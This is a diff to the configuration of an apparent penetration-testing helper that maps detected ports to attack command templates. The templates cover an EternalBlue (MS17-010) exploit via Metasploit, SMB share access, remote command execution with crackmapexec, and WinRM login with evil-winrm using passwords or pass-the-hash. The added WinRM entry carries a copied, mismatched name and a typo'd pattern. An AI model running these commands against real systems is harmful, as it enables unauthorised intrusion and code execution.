@@ -74,7 +74,7 @@ group: USEFUL COMMAND
 description: exploit ms17-010 vulnerability
 template: searchsploit -m 42315.py; python 42315.py {host}
 template: msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set rhosts {host}; set lhost {localip}; exploit"
-condition: [".*ms17-010.*"]
+condition: ["ms17-010"]
 group: Exploit Command
 [end]
 
@@ -103,14 +103,14 @@ group: Exploit Command
 description: connect shared drive via SMB using smbclient
 template: smbclient -L //{host}
 template: smbclient -N //{host}/{SMBDrive}
-condition: ["139", "445", ".*netbios.*", ".*microsoft-ds.*"]
+condition: ["139", "445", "netbios", "microsoft-ds"]
 group: SMB
 [end]
 
 [Echidna]
 description: crackmapexec can execute commands abusing any of mmcexec, smbexec, atexec, wmiexec being wmiexec the default method. Y
 template: crackmapexec smb {host} -u <username> -p <password> -x whoami
-condition: ["139", "445", ".*netbios.*", ".*microsoft-ds.*"]
+condition: ["139", "445", "5985", "5986", "netbios", "microsoft-ds"]
 group: SMB
 [end]
 
@@ -249,5 +249,14 @@ name: Scan smb version via metasploit module
 template: msfconsole -q -x "use auxiliary/scanner/smb/smb_version; set rhosts {host}; exploit"
 condition: ["139", "445", "netbios", "microsoft-ds"]
 group: SMB
+[end]
+
+[Echidna]
+pattern: evin-winrmi
+name: Scan smb version via metasploit module
+template: evil-winrm -i {host} -u <UserName> -H <Hash>
+template: evil-winrm -i {host} -u '<UserName>' -p '<Password>'
+condition: ["5985", "5986"]
+group: WinRM
 [end]
 
